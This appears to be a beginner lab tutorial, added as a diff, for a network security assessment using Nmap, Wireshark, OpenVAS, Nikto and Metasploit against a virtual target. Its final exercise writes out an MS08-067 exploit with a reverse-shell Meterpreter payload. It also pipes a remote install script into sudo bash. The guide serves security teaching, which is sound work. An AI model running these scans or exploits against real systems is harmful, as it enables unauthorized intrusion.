@@ -1,0 +1,183 @@
+Basic Network Security Assessment: Identifying Vulnerabilities in Network Configurations
+
+Introduction
+
+Network security is a critical aspect of protecting an organization’s data and resources from unauthorized access and cyber threats. 
+This project guides you through a basic network security assessment, focusing on identifying common vulnerabilities in network configurations. 
+You’ll use a variety of tools to scan, analyze, and secure your network.
+
+Pre-requisites
+
+To successfully complete this project, you should have:
+
+    A basic understanding of networking concepts (IP addresses, subnets, routers, etc.).
+    Familiarity with the Linux command line.
+    A computer with a Linux operating system (preferably Ubuntu).
+    An internet connection to download necessary tools.
+
+Lab Setup and Tools
+
+Lab Environment:
+
+    Create a virtualized network setup using VirtualBox or VMware.
+    Use at least two virtual machines: one as the target system and one as the attacker.
+
+Required Tools:
+
+    Nmap
+    Wireshark
+    OpenVAS
+    Nikto
+    Metasploit
+
+
+Exercises:
+
+
+Exercise 1: Network Scanning with Nmap
+
+Objective: Identify live hosts and open ports on the target network.
+
+Steps:
+1. Install Nmap:
+
+  sudo apt-get update
+  sudo apt-get install nmap
+
+2. Scan the Network:
+
+  nmap -sn 192.168.1.0/24  
+
+This command performs a ping scan to identify live hosts.
+
+
+3. Identify Open Ports:
+
+nmap -sS 192.168.1.10  
+
+Replace 192.168.1.10 with the IP address of a live host from the previous step.
+
+
+Expected Output:
+-A list of live hosts in the network.
+-Open ports on the specified host.
+
+
+Exercise 2: Traffic Analysis with Wireshark
+
+Objective: Capture and analyze network traffic to identify potential security issues.
+
+Steps:
+1. Install Wireshark:
+
+  sudo apt-get install wireshark  
+
+
+2. Capture Network Traffic:
+  - Open Wireshark.
+  - Select the network interface to capture traffic.
+  - Click the "Start" button to begin capturing packets
+
+
+3. Analyze Captured Traffic:
+  - Look for suspicious activity such as repeated requests, unusual protocols, or large data transfers.
+
+
+Expected Output:
+- A capture file containing network traffic data.
+- Identification of any suspicious traffic patterns.
+
+
+
+Exercise 3: Vulnerability Scanning with OpenVAS
+
+Objective: Perform a vulnerability scan on the target network to identify known vulnerabilities.
+
+
+Steps:
+1. Install OpenVAS:
+
+
+    sudo apt-get install openvas  
+    sudo openvas-setup 
+
+
+2. Configure and Start OpenVAS:
+  - Access the OpenVAS web interface (typically at https://localhost:9392).
+  - Log in with the admin credentials created during setup.
+
+
+3. Run a Vulnerability Scan:
+  - Create a new scan task.
+  - Set the target IP address range.
+  - Start the scan and wait for it to complete.
+
+Expected Output:
+-A report detailing identified vulnerabilities and their severity.
+
+
+
+Exercise 4: Web Server Assessment with Nikto
+
+Objective: Assess a web server for common vulnerabilities using Nikto.
+
+
+Steps:
+1. Install Nikto:
+
+    sudo apt-get install nikto 
+
+
+2. Scan the Web Server:
+
+    nikto -h http://192.168.1.10  
+
+
+Replace 192.168.1.10 with the target web server’s IP address.
+
+
+Expected Output:
+-A report detailing potential vulnerabilities, misconfigurations, and other issues with the web server.
+
+
+
+Exercise 5: Exploitation Testing with Metasploit
+
+
+Objective: Use Metasploit to exploit a vulnerability identified in previous exercises.
+
+Steps:
+1. Install Metasploit:
+
+    curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msfupdate | sudo bash  
+
+
+2. Launch Metasploit Console:
+
+  msfconsole  
+
+
+3. Select and Configure an Exploit:
+
+  use exploit/windows/smb/ms08_067_netapi  
+  set RHOST 192.168.1.10  
+  set PAYLOAD windows/meterpreter/reverse_tcp  
+  set LHOST 192.168.1.20  
+  run  
+
+Replace 192.168.1.10 with the target IP address.
+Replace 192.168.1.20 with the attacker’s IP address.
+
+
+Expected Output:
+-Successful exploitation opens a Meterpreter session on the target machine.
+
+
+
+Conclusion
+
+By completing these exercises, you have gained hands-on experience in identifying and assessing common network security vulnerabilities using various tools. 
+This foundational knowledge sets the stage for more advanced security assessments and helps you strengthen network infrastructures.
+
+
+
